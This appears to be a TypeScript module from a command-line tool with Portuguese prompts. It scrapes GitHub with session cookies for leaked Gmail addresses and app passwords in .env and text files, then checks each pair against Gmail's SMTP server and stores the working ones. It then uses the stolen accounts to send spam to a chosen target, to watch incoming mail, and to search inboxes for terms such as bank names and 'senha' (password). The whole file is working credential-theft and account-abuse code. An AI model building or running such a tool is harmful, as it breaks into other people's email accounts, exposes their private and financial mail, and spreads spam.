import { input, select, confirm } from "@inquirer/prompts";
import chalk from "chalk";
import fs from "fs";
import ora from "ora";
import nodemailer from "nodemailer";
import { collectList } from "../utils/collectList";
import { buscarEmailsPorKeywords } from "../reader";
import { bots, GitHubScraper } from "../GitHubScraper";
import { listenEmailNotifications } from "../utils/listener";

export class Emails {
  private emailAction: string;
  constructor() {
    this.emailAction = "";
  }

  private isEmailDuplicate(
    email: string,
    filePath: string = "emails_validos.txt",
  ): boolean {
    if (!fs.existsSync(filePath)) return false;
    const content = fs.readFileSync(filePath, "utf-8");
    // Busca o email seguido de ":" para evitar falsos positivos (ex: bob@gm e bob@gmail)
    const regex = new RegExp(`^${email.toLowerCase()}:`, "m");
    return regex.test(content);
  }

  async terminalAction() {
    this.emailAction = await select({
      message: "Opções de Email:",
      choices: [
        { name: "   TestEmail (Registrar)", value: "test" },
        { name: "   Single Send (Usar salvo)", value: "single_send" },
        { name: "   SPAM emails (Usar todos)", value: "spam" },
        { name: "   Search emails", value: "search" },
        {
          name: " 🔥 Auto-Collect & Test (GitHub -> Verificador)",
          value: "auto_collect",
        },
        // No select de emailAction, adicione:
        {
          name: " 🔥 Massive Validation (Arquivo local)",
          value: "massive_validation",
        },
        { name: " 📡 Listen Email Notification", value: "listen" },
        { name: chalk.red("   Delete Email"), value: "delete" },
        { name: chalk.gray("   Voltar"), value: "back" },
      ],
    });
    switch (this.emailAction) {
      case "auto_collect":
        await this.autoCollect();
        break;
      case "massive_validation":
        await this.massiveValidation();
        break;
      case "delete":
        await this.delete();
        break;
      case "listen":
        await this.listen();
        break;
      case "test":
        await this.test();
        break;
      case "single_send":
      case "spam":
        await this.singleOrSpamSend();
        break;
      case "search":
        this.search();
        break;
    }
  }

  private async autoCollect() {
    const validFile = "emails_validos.txt";
    const tempFile = "temp_scraped_emails.txt";

    console.log(
      chalk.blue.bold("\n--- 🕵️ Configuração de Busca Automatizada ---"),
    );

    const keywords = await collectList(
      "Keywords para buscar no GitHub (ex: EMAIL_USER=be):",
      true,
    );

    const botIndex = Number(
      await input({ message: "Índice do Bot (Cookie):", default: "0" }),
    );

    // 1. SCRAPING
    const spinner = ora("Iniciando Scraper no GitHub...").start();
    const selectedCookie = bots[botIndex]?.replace(/^Cookie:\s*/i, "");
    const rawHeaders = [`Host: github.com`, `Cookie: ${selectedCookie}`].join(
      "\n",
    );

    const bot = new GitHubScraper();
    try {
      await bot.main(
        rawHeaders,
        keywords,
        tempFile,
        7,
        [".env", ".md", ".txt"],
        ["example", "YOUR_"],
        1,
        true,
      );
      spinner.succeed(
        chalk.green(`[+] Scraping finalizado. Resultados em ${tempFile}`),
      );

      if (!fs.existsSync(tempFile)) {
        console.log(chalk.red("[-] Nenhum arquivo de raspagem gerado."));
        return; // ou break dependendo do contexto do loop
      }

      const content = fs.readFileSync(tempFile, "utf-8");
      const blocks = content.split(
        "------------------------------------------------------------",
      );

      // 2. CARREGAR EMAILS JÁ EXISTENTES (Cache para performance)
      const existingEmails = new Set(
        fs.existsSync(validFile)
          ? fs
              .readFileSync(validFile, "utf-8")
              .split("\n")
              .filter(Boolean)
              .map((line: any) => line.split(":")[0].toLowerCase())
          : [],
      );

      console.log(
        chalk.cyan(
          `[*] Validando ${blocks.length} blocos (Filtro de duplicatas ativo)...\n`,
        ),
      );

      const REGEX_EMAIL = /\b[a-zA-Z0-9._%+-]+@gmail\.com\b/i;
      const REGEX_PASS =
        /\b([a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}|[a-z]{16})\b/;

      for (const block of blocks) {
        const emailMatch = block.match(REGEX_EMAIL);
        const passMatch = block.match(REGEX_PASS);

        if (emailMatch && passMatch) {
          const email = emailMatch[0].toLowerCase();
          const cleanPass = passMatch[0].replace(/[^a-z]/g, "");

          // TRAVA DE DUPLICATA COM NOTIFICAÇÃO
          if (existingEmails.has(email)) {
            console.log(
              chalk.yellow(`   [!] Ignorado: ${email} já registrado.`),
            );
            continue;
          }

          if (cleanPass.length === 16) {
            const vSpinner = ora(`Testando: ${email}`).start();
            try {
              const transporter = nodemailer.createTransport({
                host: "smtp.gmail.com",
                port: 587,
                secure: false,
                auth: { user: email, pass: cleanPass },
                connectionTimeout: 5000,
              });

              await transporter.verify();

              // SALVAMENTO E ATUALIZAÇÃO DO CACHE
              fs.appendFileSync(validFile, `${email}:${cleanPass}\n`);
              existingEmails.add(email); // Evita que o mesmo scraping registre o mesmo email duas vezes

              vSpinner.succeed(chalk.green(`HIT! ${email} salvo.`));
            } catch (err) {
              vSpinner.fail(chalk.gray(`Falha: ${email}`));
            }
          }
        }
      }

      const keep = await confirm({
        message: "Manter arquivo temporário?",
        default: false,
      });
      if (!keep) fs.unlinkSync(tempFile);
    } catch (err: any) {
      spinner.fail(chalk.red("Erro no processo: " + err.message));
    }
  }

  private async massiveValidation() {
    const inputFile = await input({
      message: "Caminho do arquivo com os blocos de texto:",
      default: "temp_scraped_emails.txt",
    });

    if (!fs.existsSync(inputFile)) {
      console.log(chalk.red("[-] Arquivo não encontrado."));
      return;
    }

    const validFile = "emails_validos.txt";
    const content = fs.readFileSync(inputFile, "utf-8");

    // Divide o arquivo pelos separadores de bloco do seu scraper
    const blocks = content.split(
      "------------------------------------------------------------",
    );

    // Carrega cache de emails já validados para evitar re-testar
    const existingEmails = new Set(
      fs.existsSync(validFile)
        ? fs
            .readFileSync(validFile, "utf-8")
            .split("\n")
            .map((l: any) => l.split(":")[0].toLowerCase())
        : [],
    );

    console.log(
      chalk.cyan(
        `[*] Iniciando validação massiva de ${blocks.length} blocos...\n`,
      ),
    );

    const REGEX_EMAIL = /\b[a-zA-Z0-9._%+-]+@gmail\.com\b/i;
    const REGEX_PASS =
      /\b([a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}[- ]?[a-z]{4}|[a-z]{16})\b/;

    for (const block of blocks) {
      const emailMatch = block.match(REGEX_EMAIL);
      const passMatch = block.match(REGEX_PASS);

      if (emailMatch && passMatch) {
        const email = emailMatch[0].toLowerCase();
        const cleanPass = passMatch[0].replace(/[^a-z]/g, "");

        if (existingEmails.has(email)) {
          console.log(chalk.yellow(`   [!] Pulando: ${email} (já no banco)`));
          continue;
        }

        const vSpinner = ora(`Validando: ${email}`).start();
        try {
          const transporter = nodemailer.createTransport({
            host: "smtp.gmail.com",
            port: 587,
            secure: false,
            auth: { user: email, pass: cleanPass },
            connectionTimeout: 5000,
          });

          await transporter.verify();

          fs.appendFileSync(validFile, `${email}:${cleanPass}\n`);
          existingEmails.add(email);
          vSpinner.succeed(chalk.green(`HIT! ${email}`));
        } catch (err) {
          vSpinner.fail(chalk.gray(`Falha: ${email}`));
        }
      }
    }
    console.log(chalk.blue.bold("\n[+] Processo de validação concluído."));
  }

  private async delete() {
    if (!fs.existsSync("emails_validos.txt")) {
      console.log(chalk.red("[-] Nenhum email para deletar."));
      return;
    }
    const lines = fs
      .readFileSync("emails_validos.txt", "utf-8")
      .split("\n")
      .filter(Boolean);
    const toDelete = await select({
      message: "Selecione o email para REMOVER:",
      choices: lines.map((l) => ({ name: l, value: l })),
    });
    const newLines = lines.filter((l) => l !== toDelete);
    fs.writeFileSync(
      "emails_validos.txt",
      newLines.join("\n") + (newLines.length ? "\n" : ""),
    );
    console.log(chalk.green("[!] Email removido com sucesso."));
  }

  private async listen() {
    if (!fs.existsSync("emails_validos.txt")) {
      console.log(chalk.red("[-] Nenhum e-mail salvo encontrado."));
      return;
    }

    const lines = fs
      .readFileSync("emails_validos.txt", "utf-8")
      .split("\n")
      .filter(Boolean);

    const selectedAccount = await select({
      message: "Selecione a conta para colocar em ESCUTA:",
      choices: lines.map((l) => ({ name: l, value: l })),
    });

    const [u, p] = selectedAccount.split(":");

    // Chama a função de escuta (que criamos no listener.ts)

    const news = await listenEmailNotifications(u, p);

    if (news.length > 0) {
      console.log(
        chalk.green(
          `\n\n[!] Escuta finalizada. ${news.length} emails capturados.`,
        ),
      );

      let browsing = true;
      while (browsing) {
        const viewChoice = await select({
          message: "Gerenciar emails capturados:",
          choices: [
            {
              name: "🔍 Selecionar e ler email (Ver conteúdo)",
              value: "read",
            },
            { name: "💾 Salvar todos em .txt", value: "save" },
            {
              name: chalk.gray("⬅ Voltar ao menu principal"),
              value: "back",
            },
          ],
        });

        if (viewChoice === "back") {
          browsing = false;
          break;
        }

        if (viewChoice === "read") {
          const targetMsg = await select({
            message: "Escolha qual email deseja abrir:",
            choices: [
              ...news.map((n, i) => ({
                name: `[${i + 1}] De: ${n.from} | Assunto: ${n.subject}`,
                value: i,
              })),
              { name: chalk.red(" Escolher outra opção..."), value: -1 },
            ],
          });

          if (targetMsg === -1) continue;

          console.clear();
          console.log(chalk.yellow.bold("\n--- CABEÇALHO ---"));
          console.log(chalk.white(`DE: ${news[targetMsg].from}`));
          console.log(chalk.white(`ASSUNTO: ${news[targetMsg].subject}`));
          console.log(chalk.yellow.bold("\n--- CONTEÚDO (RAW SOURCE) ---"));
          console.log(chalk.cyan(news[targetMsg].body));
          console.log(chalk.yellow.bold("\n-----------------------------\n"));

          await input({
            message: chalk.gray(
              "Pressione Enter para voltar à lista de capturados...",
            ),
          });
          console.clear();
        }

        if (viewChoice === "save") {
          const logName = await input({
            message: "Nome do arquivo para salvar a sessão:",
            default: `session_${u.split("@")[0]}.txt`,
          });

          const content = news
            .map(
              (n: any) =>
                `DE: ${n.from}\nASSUNTO: ${n.subject}\nCONTEÚDO:\n${n.body}\n${"=".repeat(40)}\n`,
            )
            .join("\n");

          fs.writeFileSync(logName, content);
          console.log(
            chalk.green(
              `[+] Todos os ${news.length} emails salvos em ${logName}`,
            ),
          );
        }
      }
    } else {
      console.log(
        chalk.gray("\n[-] Nenhum email chegou durante a sessão de escuta."),
      );
    }
  }

  private async test() {
    while (true) {
      const user = await input({
        message: "Email:",
        default: "digite o email ou .exit pra sair",
      });

      if (user === ".exit") break;

      const pass = await input({
        message: "Senha:",
        default: "digite a senha ou .exit pra sair",
      });

      if (pass === ".exit") break;

      if (this.isEmailDuplicate(user)) {
        console.log(
          chalk.red(`\n [X] Erro: O e-mail ${user} já está registrado!\n`),
        );
        continue; // Volta para o prompt de e-mail
      }

      const spinner = ora("Validando...").start();
      try {
        const transporter = nodemailer.createTransport({
          service: "gmail",
          auth: { user, pass },
        });
        await transporter.verify();
        fs.appendFileSync("emails_validos.txt", `${user}:${pass}\n`);
        spinner.succeed(chalk.green("Válido e salvo em emails_validos.txt"));
      } catch (err: any) {
        spinner.fail(chalk.red("Erro: " + err.message));
      }
      const enter = await input({
        message: "Continuar",
      });
      console.clear();
    }
  }

  private async singleOrSpamSend() {
    if (!fs.existsSync("emails_validos.txt")) {
      console.log(chalk.red("[-] Nenhum email salvo encontrado."));
      return;
    }
    const lines = fs
      .readFileSync("emails_validos.txt", "utf-8")
      .split("\n")
      .filter(Boolean);
    const subject = await input({ message: "Subject de destino:" });
    const target = await input({ message: "Email de destino:" });
    const content = await input({ message: "Conteúdo da mensagem:" });

    if (this.emailAction === "single_send") {
      const li = lines.map((l) => ({ name: l, value: l }));
      li.push({ name: "exit", value: "exit" });
      const selected = await select({
        message: "Escolha a credencial:",
        choices: li,
      });

      if (selected === "exit") return;

      const [u, p] = selected.split(":");

      const s = ora("Enviando...").start();
      try {
        const transporter = nodemailer.createTransport({
          service: "gmail",
          auth: { user: u, pass: p },
        });
        await transporter.sendMail({
          from: u,
          to: target,
          subject,
          text: content,
        });
        s.succeed(chalk.green("Enviado!"));
      } catch (err: any) {
        s.fail(chalk.red(err.message));
      }
    } else if (this.emailAction === "spam") {
      console.log(
        chalk.yellow(`[*] Iniciando SPAM com ${lines.length} contas...`),
      );
      for (const line of lines) {
        const [u, p] = line.split(":");
        const s = ora(`Enviando de: ${u}`).start();
        try {
          const transporter = nodemailer.createTransport({
            service: "gmail",
            auth: { user: u, pass: p },
          });
          await transporter.sendMail({
            from: u,
            to: target,
            subject,
            text: content,
          });
          s.succeed();
        } catch (err: any) {
          s.fail(chalk.red(`Falha: ${u}`));
        }
      }
    }
  }

  private async search() {
    if (!fs.existsSync("emails_validos.txt")) {
      console.log(chalk.red("[-] Nenhum e-mail salvo encontrado."));
      return;
    }

    const searchKeywords = await collectList(
      "Keywords para buscar (ex: @nubank, senha):",
      true,
    );

    // Pergunta o nome do arquivo de saída
    const outputFile = await input({
      message: "Nome do arquivo para salvar os resultados:",
      default: "search_results.txt",
    });

    const lines = fs
      .readFileSync("emails_validos.txt", "utf-8")
      .split("\n")
      .filter(Boolean);
    console.log(
      chalk.yellow(
        `[*] Iniciando busca profunda em ${lines.length} contas...\n`,
      ),
    );

    for (const line of lines) {
      const [u, p] = line.split(":") as any;
      const s = ora(`Acessando: ${u}`).start();

      try {
        // A função agora retorna os matches encontrados
        const results = await buscarEmailsPorKeywords(searchKeywords, u, p);

        if (results && results.length > 0) {
          const dataToSave = results
            .map(
              (res) =>
                `CONTA: ${u}\nDE: ${res.from}\nASSUNTO: ${res.subject}\nID: ${res.id}\n---------------------------\n`,
            )
            .join("");

          fs.appendFileSync(outputFile, dataToSave);
          s.succeed(
            chalk.green(`Encontrados ${results.length} matches em ${u}`),
          );
        } else {
          s.info(chalk.gray(`Nenhum match em ${u}`));
        }
      } catch (err: any) {
        s.fail(chalk.red(`Erro em ${u}: ${err.message}`));
      }
    }
    console.log(chalk.cyan(`\n[!] Relatório completo salvo em: ${outputFile}`));
  }
}
